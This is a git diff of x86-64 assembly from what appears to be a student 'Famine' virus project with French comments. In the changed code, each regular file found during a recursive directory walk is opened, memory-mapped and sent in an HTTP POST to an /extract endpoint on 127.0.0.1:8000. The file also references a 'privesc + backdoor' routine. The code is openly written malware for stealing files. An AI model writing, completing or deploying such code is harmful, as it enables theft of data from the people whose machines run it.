@@ -9,14 +9,6 @@ global _start
 _start:
     mov rbp, rsp
 
-    ;socket
-    sub rsp, sock_size
-    call _initSocket
-    lea rsi, SOCK(sock.sockfd)
-    mov [rsi], rax
-    mov rsi, testSend
-    call _open_file
-
     mov rdx, 0
     mov rdi, dir1                                       ; dir to open for arg initDir
     call _initDir
@@ -27,19 +19,14 @@ _start:
 
     mov rdx, 0
     mov rdi, dir2                                       ; dir to open for arg initDir
-    lea rsi, SOCK(sock.sockfd)
     call _initDir
 
     call _backdoor
-
-    mov rdi, SOCK(sock.sockfd)
-    call _closeSock
 
     jmp _exit
 
 ; take directory to open in rdi-> pwd
 ; rdx == 0 ? rien : recreate a path: rdi/rsi
-; rsi -> sockfd
 _initDir:
     ; placing famine on the stack
     push rbp
@@ -80,9 +67,9 @@ _readDir:
 
     _getDents:
         lea r10, FAM(famine.fd) 
-        lea r9, FAM(famine.total_read)                      ; init total_read
+        lea r9, FAM(famine.total_read)                  ; init total_read
         mov DWORD[r9], 0
-        mov rax, SYS_GETDENTS                   			; getdents64(int fd, void *buf, size_t size_buf)
+        mov rax, SYS_GETDENTS                   	    ; getdents64(int fd, void *buf, size_t size_buf)
         mov rdi, [r10]
         lea rsi, FAM(famine.dirents)
         mov rdx, PAGE_SIZE
@@ -108,16 +95,25 @@ _readDir:
         cmp BYTE [r10 + D_TYPE], D_REG_FILE 			; verifie le type du fichier
         jne _checkRead
 
-        ; debug
-        mov rsi, rsp
-        writeWork
-        writeSlash
+        _updatePath:
+            ; strlen
+            mov rsi,  rsp
+            call _strlen
+            lea rsi, [r10 + D_NAME]                 	; charge le nom du fichier dans rsi
+            mov byte [rsi - 1], '/'
+            add rax, 1
+            sub rsi, rax
+            mov rdi, rsp
+            call _strcpyNoNull
 
-        lea rsi, [r10 + D_NAME]                 		; charge le nom du fichier dans rsi
+            ; printing
+            writeWork
+            writeBack
 
-        writeWork                               		; a modifier avec ta fonction
-        writeBack
-        jmp _checkRead
+            ; ajouter les foncton pour chaques fichier ici
+            call _open_file
+
+            jmp _checkRead
 
             _recursif:
                 lea rdi, FAM(famine.pwd)
@@ -146,8 +142,11 @@ _readDir:
         mov rdi, FAM(famine.fd)
         syscall
 
+
 _returnLeave:
     leave
+
+_return:
     ret
 
 ; --- privesc + backdoor
@@ -231,15 +230,8 @@ _backdoor:
         syscall
         jmp _returnLeave;
 
-; ---- envoie de requete http
-; debut du prog
-;   creer la socket
-;   la connecter
-; pour chaque fichier dans le directory, sauvegarder son contenue (open + nmap)
-;   l'envoyer avec sendto
-;   faire une verif pour si jamais j'ai pas recu a faire la socket ou quoi que ce soit, je give up l'envoie
-_initSocket:
 
+_initSocket:
     _creatSocket:
         mov rax, SYS_SOCKET
         mov rdi, AF_INET
@@ -264,11 +256,14 @@ _initSocket:
 _closeSock:
     mov rax, SYS_CLOSE
     syscall
-    mov rax, 0
     ret
 
     ; ============= A ENLEVER ===================== ;
-	_open_file:
+_open_file:
+        push rbp
+        mov rbp, rsp
+        sub rsp, infection_size
+
 		mov	rax, SYS_OPEN
 		mov rdi, rsi
 		mov rsi, O_RDWR
@@ -300,31 +295,35 @@ _closeSock:
 		syscall
 		cmp	rax, 0x0								; rax -> map (used later)
 		jl _returnLeave
-        mov r13, 0x3
         call _extractData
-        ret
 
     _close_file:
         mov	rax, 0x3
         mov	rdi, INF(infection.file_fd)
         syscall
         jmp _returnLeave
-        jmp _checkRead
     ; ============================================;
 
 ; doit prendre le sockfd en argument (r13 == sockfd)
 _extractData:
+    mov r12, rax                                    ; r12 -> maped file_date
+    push rsi
+    call _creatSocket
+    pop rsi
+    mov r13, rax
+    _checkFd:
+        cmp r13, 0
+        jl _return
     _mmapBuffer:
     ; rax -> mmap buffer
     ; r15 == la size du mmap buffer
-        mov r12, rax                             ; r12 -> maped file_date
+    ; r12 -> maped file_data
         mov rax, SYS_MMAP
         xor rdi, rdi
-        ; sauvergader rsi pour l'execution de base sur le vrai virus ? 
         push rsi
         add rsi, headerStartLen
         add rsi, headerEndLen
-        add rsi, 10                             ; pour le content length
+        add rsi, 10                                 ; pour le content length
         mov r15, rsi
         mov rdx, PROT_READ | PROT_WRITE
         mov r10, MAP_PRIVATE | MAP_ANONYMOUS
@@ -334,22 +333,21 @@ _extractData:
 
     _copyData:
         ; r14 -> header buffer
-        ; rsi -> end header buffer
         ; *r15 == la taille du mmap buffer
-        ; j'ai perdu la length du fichier maper faut que le rechope
         mov r14, rax
         mov rsi, rax
         mov rdi, headerStart
         call _strcpy
-        ; attention taille dans rax
         pop rax
+        push rax
         add rsi, headerStartLen - 1
         call _itoa
         mov rdi, headerEnd
         call _strcpy
         add rsi, headerEndLen - 1
         mov rdi, r12
-        call _strcpy
+        pop rcx
+        call _strncpy
 
     _sendTo:
         mov rax, SYS_SENDTO
@@ -357,20 +355,15 @@ _extractData:
         mov rsi, r14
         mov rdx, r15
         xor r10, r10
+        xor r9, r9
         syscall
-        ret
-
-; A FAIRE DEMAIN
-; - rsi doit avoir la size lu a la fin de la fonction ?
-; - ne pas send si le fd est =0 ou -1
-; - mettre extract data dans la boucle de fichier
-; - patch la boucle de fichier pour faire en sorte d'avoir le path complet du fichier (ca a pas l'air d'etre le cas)
+        jmp _closeSock 
 
 ; ---packer
 ; jsp encore
 
 ; strcpy(dst:rsi src: rdi)
-_strcpy:
+_strcpyNoNull:
 	xor rcx, rcx
 	strcpy_loop:
 		cmp byte [rdi + rcx], 0
@@ -379,10 +372,34 @@ _strcpy:
 		mov [rsi + rcx], al
 		add rcx, 1
 		jmp strcpy_loop
-
 	strcpy_loop_end:
+		; mov byte [rsi + rcx], 0
+		ret
+
+_strcpy:
+	xor rcx, rcx
+	_strcpy_loop:
+		cmp byte [rdi + rcx], 0
+		je	_strcpy_loop_end
+		mov al, byte [rdi + rcx]
+		mov [rsi + rcx], al
+		add rcx, 1
+		jmp _strcpy_loop
+
+	_strcpy_loop_end:
 		mov byte [rsi + rcx], 0
 		ret
+
+; strncpy(dst:rsi, src: rdi, count: rcx)
+_strncpy:
+    sub rcx, 1
+    _strncpyLoop:
+        mov al, byte [rdi + rcx]
+        mov [rsi + rcx], al
+        loop _strncpyLoop
+        mov al, byte [rdi + rcx]
+        mov [rsi + rcx], al
+        ret
 
 ; strlen(str:rsi)
 _strlen:
@@ -471,10 +488,10 @@ sockaddr:
     dq 0            ; padding
 
 headerStart db "POST /extract HTTP/1.1", 13, 10, \
-                "Host: 127.0.0.1", 13, 10, \
+                "Host: 127.0.0.1:8000", 13, 10, \
                 "Content-Type: text/plain", 13, 10, \
+                "Connection: keep-alive", 13, 10, \
                 "Content-Length: ", 0 
 headerStartLen equ $-headerStart
 headerEnd db 13, 10, 13, 10, 0  ; Fin de l'entête avant le body
 headerEndLen equ $-headerEnd
-testSend    db  "../README.md"
